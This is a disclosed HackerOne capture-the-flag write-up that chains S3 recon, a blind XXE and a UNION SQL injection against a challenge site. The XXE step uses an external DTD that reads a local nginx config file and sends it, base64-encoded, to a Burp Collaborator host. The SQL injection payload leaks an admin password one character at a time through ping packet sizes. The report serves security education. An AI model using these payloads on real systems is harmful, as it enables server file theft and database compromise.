# CCC H1 June 2021 CTF Writeup

## Report Details
- **Report ID**: 1217114
- **URL**: https://hackerone.com/reports/1217114
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-06-03T20:14:14.326Z
- **Disclosed**: 2021-06-21T20:44:47.502Z

## Reporter
- **Username**: pmnh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## CTF Summary

This was my first H1 CTF and I was excited to work with several others to collaborate on the CTF and find the flag. I'll write up the solution process and vulnerabilities involved in the solution:

 * Knowledge (basic) of S3 operations
 * XML External Entities and Local File Exfiltration
 * SQL Injection (+source code review)
 * A very clever use of exfiltration using ICMP ping

The general theme of this CTF involved several out-of-band or blind attacks, which were not obvious on initial review.

## Phase 1: CCC web site and initial recon
The CTF site was located at https://ccc.h1ctf.com and contains a basic login page and registration feature. Registration is open to any user and requires no verification.

Upon registration, a user is redirected to the following page: https://ccc.h1ctf.com/u/sd2gah with an error message "Remote File list not found" and is presented with a unique hash key in the URL (e.g. `sd2gah`):
{F1325196}

We were initially stuck here, did some fuzzing etc., until an eagle-eyed member of our team spotted a clue in the Twitter feed for CCC Designs:
https://twitter.com/DesignsCcc/status/1398629597298806786/photo/1

We could see that the screen shot illustrates a file with the name `error_-_-_log.txt` located at the following URL: https://ccc.h1ctf.com/error_-_-_log.txt

The content of the file suggests S3 is involved:
```
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://█████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://██████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
```

We noticed that the suffix of the bucket name is a 6 character value, which looks suspiciously like the hash value we were assigned at registration time. We attempted to access each of these files and found one that seemed promising:

https://███.s3.eu-west-2.amazonaws.com/files.xml

```
<Message>The bucket you are attempting to access must be addressed using the specified endpoint. Please send all future requests to this endpoint.</Message>
<Endpoint>s3.amazonaws.com</Endpoint>
```

No problem, we'll use the URL rooted at `s3.amazonaws.com`: https://s3.amazonaws.com/███/files.xml

Here, we see the file suggests that XXE might be a valid attack vector:

```xml

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

We then created a `files.xml` in a new S3 bucket based on our hash, located here: https://h1-sd2gah.s3.eu-west-2.amazonaws.com/files.xml

After creating an empty XML file we confirmed the application is reading the file, as we see a different error message when reloading the page!

```html
<p><strong>Critical</strong> : File List Format Invalid</p>
```

So this is great because we demonstrated that the `files.xml` file is being pulled from the new S3 bucket that we set up.

## Phase 2: Build XXE payload to exfiltrate files on the server

This was a fun phase because I had never actually performed a 2-stage XXE required for local file inclusion. This was also a challenge because the XXE was blind (the XML document with entity replacement was not visible to the attacker), so we had to come up with an out-of-band method to exfiltrate the data.

We first set up a basic one-stage XXE to confirm that we had outbound connectivity, so we replaced `files.xml` with the following. Upon page reload, we validated that we got a ping on Collaborator:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://dct3rq1rn24apf28qeowjcmwpnvmjb.burpcollaborator.net/?">
    %xxe;
]>
<list></list>
```

Of course, in no circumstance did the page actually render the XML but this was not the point of this challenge. Now that we established outbound connectivity, we had to determine how to exfiltrate file content. After much trial and error we determined that the following payload could be used to exfiltrate files and local HTTP requests. First, we wrote an updated `files.xml` which references an external DTD. This is required to create more complex `ENTITY` mappings. So our `files.xml` now looks like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://h1-sd2gah.s3.eu-west-2.amazonaws.com/evil.dtd"> %xxe;]>
<list></list>
```

We also upload the referenced `evil.dtd` to our S3 bucket:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

We can explain this a little bit. We define an entity `%file` containing the base 64-encoded contents of the file referenced in the `resource` parameter to the PHP filter. Without base64-encoding, this local file include will fail because it expects that the resulting entity contains valid DTD syntax. Then, the `%eval` entity is declared as an external `http` request to our burp collaborator endpoint. The `%eval` declaration will evaluate the first entity, and then the `%evaluate` declaration will evaluate the final payload.

This will result in a request to Burp Collaborator as follows:

```http
GET /?x=IyMKIyBZb3(long base64 string) HTTP/1.0
Host: 4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net
Connection: close
```

By decoding the contents of the `x` parameter, we can get the content of local files or local http endpoints!

Initially we thought the next attack vector was to try to access the AWS IMDSv1 endpoint located at `169.254.169.254` and available only from the local machine; however, we only had access to limited metadata and not enough that we could make AWS API requests or access the local machine further (for example through the SSM functionality to perform RCE).

We then reviewed he ccc-designs Twitter feed and noted this comment "Does anyone know if in nginx you can link a directory to a proxy_pass?" - which caused us to start looking at the nginx configuration available on the machine.

We found that the contents of the `/etc/nginx/sites-enabled/default` file indicated that a directory on the main site was reverse proxied to another local server:

```
#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
```

We checked and validated that `https://ccc.h1ctf.com/2b5d2b11513d2c9b` contained a new application "net pinger". This brought us to the 3rd phase of this CTF!

Note that we tried various other recon techniques using the LFI including accessing local endpoints, trying to read source code, `/etc/passwd` etc., but these did not bear fruit, and in fact we found an `index.php` file containing a hash that rickrolled us :D

## Phase 3: Net Pinger
In the 3rd and final phase of this CTF, we are presented with a login screen to a "Net Pinger" application with no obvious way to log in!

We fuzzed the new directory using ffuf and found that a `.git` directory was present on the server:

```
scan@scanner-1:~$ ./ffuf -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" -ac -w SecLists/Discovery/Web-Content/common.txt  -u https://ccc.h1ctf.com/2b5d2b11513d2c9b/FUZZ

(snip)

.git/config             [Status: 200, Size: 263, Words: 19, Lines: 12]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.git                    [Status: 403, Size: 170, Words: 5, Lines: 7]
```

We acquired these files and found that there was a reference to a public repository on Github:

```
[remote "origin"]
	url = https://github.com/ccc-labs/pinger.git
```

Great! This repo contained the code for the whole application. After some review we found there is a publicly accessible endpoint `/api/ping` which is an unauthenticated endpoint meant to do the following:

  * Take an `id` GET parameter
  * Find a row in the `host` SQL table with the `id` column of this parameter
  * Send a `ping` to the host specified in this table row 

The code for this action is found here: https://github.com/ccc-labs/pinger/blob/8fce47791b92f183c0f1a7e033c87bab4881737d/_pingercode_/models/Ping.php#L10

We confirmed that the API can be invoked using the URL `https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=1`, although the results of the ping are not visible to the caller.

Upon code review we determined that the SQL code used to load the record from the database is vulnerable to SQL injection due to lack of prepared statements or parameter sanitization:

```python
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
```

Unfortunately after some evaluation we determined that there is no visible error or output from the ping command, SQL syntax errors or execution errors are not reported. Furthermore, we cannot use the `sleep` or `benchmark` commands because they are blocked by a WAF, making typical blind time-based SQLi attacks infeasible.

We were stuck here for a bit and then decided to take a look at how the `ping` command was executed. The line of code executing the ping command looks like this:

```python
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
```

The `$packet_size` variable is set from the `packet_size` column of the select statement, and the `$ip` variable is set from the `ip` column. By reviewing the DDL for the table located in the Github repository we determined that the column order was: `id, ip, packet_size`.

Initially we thought an approach where we could insert into the table could allow us to achieve RCE by inserting commands into the `ping` command line, unfortunately there was not any way to manipulate the contents of the table - *however* we had a hunch...

Although we couldn't verify that a `UNION` would work, we took a guess that it would. So we were looking for a payload that would UNION a 3-column result set, and some way to validate that we could receive an ICMP ping from this server.

Using our VPS with a public static IP address, we ran `tcpdump` to listen for ICMP traffic, after first confirming that ICMP rules were applied to firewalls and that we could receive ping requests. Running the following command allowed us to listen for inbound ping requests:

```
tcpdump ip proto \\icmp
```

Once we did this we issued a simple UNION to confirm that we could receive a ping from the server: `-1 UNION SELECT 4,'161.35.110.235',32 from user where id=1 limit 1 -- `, making the full query (where `my_ip` is the IP address on my VPS):

```
select * from host where id = -1 UNION SELECT 4,'my_ip',32 from user where id=1 limit 1 -- LIMIT 1`
```

This could be executed with the following URL:
`https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=-1%20UNION%20SELECT%204%2c'my_ip'%2c32%20from%20user%20where%20id%3d1%20limit%201%20--%20`

We received a ping on the ICMP port so this confirmed we were on the right track!
```
13:18:19.051334 IP ███████ > scanner-1: ICMP echo request, id 1, seq 50, length 40
13:18:19.051374 IP scanner-1 > █████: ICMP echo reply, id 1, seq 50, length 40
```

This confirmed that we could control the arguments to the `ping` command without being able to insert database data! Unfortunately upon further code review, filtering was in place to ensure these parameters were not injectable for RCE - packet length was restricted to an integer, and the IP parameter was validated as an IPv4 address - so no chance of RCE via ping.

So finally the question was, how can we exfiltrate database data? In a classic blind SQLi you can use some sort of canary with a boolean condition such as a sleep/wait or the return of a true/false value, unfortunately we had none of these. However, we had 2 variables to play with - IP address and packet size. We needed the IP address to remain constant so that we could receive the OOB ping (true/false). Initially we started treating this as a boolean attack, by using the fact that we received a ping as a "true" vale, and non-receipt of a ping as a "false" value.

However, this was very time consuming due to aggressive rate limiting on this endpoint. We then considered the _other_ parameter - packet size. Could we set the packet size to a known value, that we could use to exfiltrate data?

Turns out the answer is yes :) We were able to exfiltrate the admin password a character at a time, by translating the letter values to ASCII, and then using these ASCII values to set the packet size on the ping request. The following SQL, executed for every character in the `SUBSTRING` command, provided us with the ability to extract a single character at a time from the admin password, and set the packet size to the ASCII value of that character. The union parameter now looks like this:

```
-1 UNION SELECT 4,'my_ip',ascii(substring(password,1,1)) from user where id=1 -- 
```

We see that the packet size received by our `tcpdump` has changed:

```
13:28:36.258314 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > scanner-1: ICMP echo request, id 306, seq 1, length 93
```

Each ICMP packet has a base size of 8 bytes, so we need to subtract 8 from the `length 93` to get a value of `85` or an ASCII value of `U`.

We repeated this query for every character of the password, incrementing the 2nd parameter to `substring` until we did not receive a ping, at which point we knew the SQL was throwing an error and we had read all the characters. This gave us the following mapping:

```
93 	--> 85	--> U
108 	--> 100	--> d
63 	--> 55	--> 7
65 	--> 57	--> 9
102 	--> 94	--> ^
57	--> 49	--> 1
80	--> 72	--> H
80	--> 72	--> H
82	--> 74	--> J
44	--> 36	--> $
95	--> 87	--> W
50	--> 42	--> *
81	--> 73	--> I
87	--> 79	--> O
106	--> 98	--> b
105	--> 97	--> a
83	--> 75	--> K
108	--> 100	--> d
89	--> 81	--> Q
111	--> 103	--> g
81	--> 73	--> I
```

... which gave us an admin password of `Ud79^1HHJ$W*IObaKdQgI`. We validated that this allowed us to access the admin panel and acquire the (only) flag.

Unfortunately we did not find a way to bypass the 1 request per minute rate limit :( so extracting this took 21 minutes of waiting :)

Thanks for the great CTF, this was my first H1 CTF and I participated with a great team!

## Impact

Through XXE, the attacker could read files, access internal endpoints, etc., though SQLi, the attacker could exfiltrate any data in the database.

## Attachments
- ccc_post_reg.png
